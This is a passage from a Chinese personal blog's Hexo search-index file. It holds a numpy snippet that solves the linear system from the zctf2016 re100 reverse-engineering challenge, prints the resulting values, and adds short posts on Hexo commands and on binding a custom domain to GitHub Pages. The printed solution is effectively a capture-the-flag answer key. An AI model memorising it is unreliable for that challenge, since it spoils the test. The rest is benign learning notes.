class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> mat, matrix</span><br><span class="line">a = mat(</span><br><span class="line">    [</span><br><span class="line">        [<span class="number">0x4D</span>, <span class="number">0x79</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>,</span><br><span class="line">         <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x68</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x74</span>],</span><br><span class="line">        [<span class="number">0x49</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x74</span>, <span class="number">0x63</span>,</span><br><span class="line">         <span class="number">0x68</span>, <span class="number">0x6F</span>, <span class="number">0x6F</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x65</span>],</span><br><span class="line">        [<span class="number">0x4D</span>, <span class="number">0x79</span>, <span class="number">0x77</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x73</span>,</span><br><span class="line">         <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x6F</span>, <span class="number">0x6C</span>, <span class="number">0x73</span>],</span><br><span class="line">        [<span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x79</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x61</span>,</span><br><span class="line">         <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x79</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x64</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>],</span><br><span class="line">        [<span class="number">0x44</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x74</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x61</span>,</span><br><span class="line">         <span class="number">0x74</span>, <span class="number">0x79</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x76</span>],</span><br><span class="line">        [<span class="number">0x44</span>, <span class="number">0x65</span>, <span class="number">0x6C</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x69</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>,</span><br><span class="line">         <span class="number">0x73</span>, <span class="number">0x6F</span>, <span class="number">0x66</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x77</span>, <span class="number">0x6C</span>],</span><br><span class="line">        [<span class="number">0x4C</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x6E</span>, <span class="number">0x6D</span>, <span class="number">0x79</span>,</span><br><span class="line">         <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x74</span>],</span><br><span class="line">        [<span class="number">0x53</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x75</span>, <span class="number">0x6E</span>, <span class="number">0x73</span>, <span class="number">0x65</span>,</span><br><span class="line">         <span class="number">0x65</span>, <span class="number">0x6E</span>, <span class="number">0x66</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x72</span>],</span><br><span class="line">        [<span class="number">0x53</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x77</span>, <span class="number">0x69</span>, <span class="number">0x73</span>,</span><br><span class="line">         <span class="number">0x68</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>],</span><br><span class="line">        [<span class="number">0x4F</span>, <span class="number">0x6E</span>, <span class="number">0x63</span>, <span class="number">0x65</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x72</span>,</span><br><span class="line">         <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x6D</span>, <span class="number">0x74</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x74</span>],</span><br><span class="line">        [<span class="number">0x48</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x77</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x66</span>,</span><br><span class="line">         <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x66</span>, <span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x65</span>, <span class="number">0x68</span>, <span class="number">0x61</span>],</span><br><span class="line">        [<span class="number">0x49</span>, <span class="number">0x66</span>, <span class="number">0x79</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x65</span>,</span><br><span class="line">         <span class="number">0x64</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x77</span>, <span class="number">0x68</span>],</span><br><span class="line">        [<span class="number">0x49</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x74</span>,</span><br><span class="line">         <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x6F</span>, <span class="number">0x66</span>, <span class="number">0x74</span>, <span class="number">0x68</span>],</span><br><span class="line">        [<span class="number">0x54</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x49</span>, <span class="number">0x65</span>, <span class="number">0x78</span>, <span class="number">0x69</span>,</span><br><span class="line">         <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x72</span>],</span><br><span class="line">        [<span class="number">0x47</span>, <span class="number">0x6F</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x78</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x63</span>,</span><br><span class="line">         <span class="number">0x74</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x73</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x72</span>],</span><br><span class="line">        [<span class="number">0x4F</span>, <span class="number">0x42</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x79</span>, <span class="number">0x66</span>,</span><br><span class="line">         <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x79</span>, <span class="number">0x73</span>, <span class="number">0x65</span>],</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">b = mat([</span><br><span class="line">    [<span class="number">179334</span>],</span><br><span class="line">    [<span class="number">175544</span>],</span><br><span class="line">    [<span class="number">180760</span>],</span><br><span class="line">    [<span class="number">182366</span>],</span><br><span class="line">    [<span class="number">182850</span>],</span><br><span class="line">    [<span class="number">180568</span>],</span><br><span class="line">    [<span class="number">181440</span>],</span><br><span class="line">    [<span class="number">178347</span>],</span><br><span class="line">    [<span class="number">181577</span>],</span><br><span class="line">    [<span class="number">176475</span>],</span><br><span class="line">    [<span class="number">174043</span>],</span><br><span class="line">    [<span class="number">179882</span>],</span><br><span class="line">    [<span class="number">178817</span>],</span><br><span class="line">    [<span class="number">175345</span>],</span><br><span class="line">    [<span class="number">178696</span>],</span><br><span class="line">    [<span class="number">175320</span>],</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">X = a.I * b</span><br><span class="line">print(X)</span><br></pre></td></tr></table></figure></p>
<p>numpy中的 <code>matrix</code>和 <code>mat</code> 都可以用于生成矩阵结构，mat是matrix的缩写<br>代码中 a 表示一个16x16的矩阵，代表系数矩阵；b表示一个16x1的矩阵，代表方程组的解。<br>a.I 代表矩阵a的逆矩阵，用<code>X = a.I * b</code>公式来求出方程组的解<br>运行结果 X：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[[ <span class="number">122.</span>]</span><br><span class="line"> [  <span class="number">99.</span>]</span><br><span class="line"> [ <span class="number">116.</span>]</span><br><span class="line"> [ <span class="number">102.</span>]</span><br><span class="line"> [ <span class="number">123.</span>]</span><br><span class="line"> [  <span class="number">87.</span>]</span><br><span class="line"> [ <span class="number">114.</span>]</span><br><span class="line"> [ <span class="number">111.</span>]</span><br><span class="line"> [ <span class="number">110.</span>]</span><br><span class="line"> [ <span class="number">103.</span>]</span><br><span class="line"> [  <span class="number">95.</span>]</span><br><span class="line"> [  <span class="number">70.</span>]</span><br><span class="line"> [ <span class="number">108.</span>]</span><br><span class="line"> [  <span class="number">97.</span>]</span><br><span class="line"> [ <span class="number">103.</span>]</span><br><span class="line"> [ <span class="number">125.</span>]]</span><br></pre></td></tr></table></figure></p>
<p> PS: 这是在做zctf2016的re100题目时碰到的解方程组问题，想起之前乱翻《Python机器学习实战》的时候，我扫了几眼看到了numpy可以进行矩阵运算，于是直接找出那本书学了一下。    </p>
]]></content>
      
        <categories>
            
            <category> 编程学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
            <tag> 机器学习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[各种关于Hexo的问题]]></title>
      <url>https://ex1t.cn/2017/04/02/%E5%90%84%E7%A7%8D%E5%85%B3%E4%BA%8EHexo%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<h1 id="关于Hexo的一些杂七杂八的问题"><a href="#关于Hexo的一些杂七杂八的问题" class="headerlink" title="关于Hexo的一些杂七杂八的问题"></a>关于Hexo的一些杂七杂八的问题</h1><p>hexo g = hexo generate // 生成</p>
<p>hexo d = hexo deploy // 部署</p>
<p>hexo s = hexo server // 运行服务器</p>
<p>hexo new post “article title” //新建文章</p>
<p><strong>关于图片问题可以使用hexo-asset-image插件：</strong><a href="http://www.tuicool.com/articles/umEBVfI" target="_blank" rel="noopener">在 hexo 中无痛使用本地图片</a><br><strong>Mark一些小技巧：</strong><a href="http://www.jianshu.com/p/3c0e175c077f" target="_blank" rel="noopener">Hexo的使用技巧</a><br>在文章需要折叠的地方加<code>&lt;!--more--&gt;</code></p>
]]></content>
      
        
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Github-域名绑定]]></title>
      <url>https://ex1t.cn/2017/02/21/Github-%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/</url>
      <content type="html"><![CDATA[<h1 id="Github-绑定自定义域名"><a href="#Github-绑定自定义域名" class="headerlink" title="Github 绑定自定义域名"></a>Github 绑定自定义域名</h1><p>在绑定自己的cn域名到github pages上时遇到了一点小问题，感觉自己对域名解析的理论了解的还不够透彻</p>
<p>在<a href="https://help.github.com/articles/troubleshooting-custom-domains/#dns-configuration-errors" target="_blank" rel="noopener">Github帮助文档</a>上看到了解决方法<br><a id="more"></a><br><img src="/2017/02/21/Github-域名绑定/Github.png" alt="Github帮助"></p>
<p>上面说在域名服务商那里添加A类解析到这两个IP就可以了</p>
<blockquote>
<p>192.30.252.153</p>
<p>192.30.252.154</p>
</blockquote>
<p>于是我琢磨这两个IP是干嘛的，Github是怎么知道我对应的Github Page的</p>
<hr>
<p>补坑：<a href="http://stackexit.cn/2017/11/27/%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F/" target="_blank" rel="noopener">虚拟主机的两种工作方式</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 域名 </tag>
            
            <tag> Github </tag>
            
        </tags>
        
    </entry>
    
  
  
    
    <entry>
      <title><![CDATA[categories]]></title>
      <url>https://ex1t.cn/categories/index.html</url>
      <content type="html"></content>
    </entry>
    
    <entry>
      <title><![CDATA[about]]></title>
      <url>https://ex1t.cn/about/index.html</url>
      <content type="html"></content>
    </entry>
    
    <entry>
      <title><![CDATA[tags]]></title>
      <url>https://ex1t.cn/tags/index.html</url>
      <content type="html"></content>
    </entry>
    
  
</search>
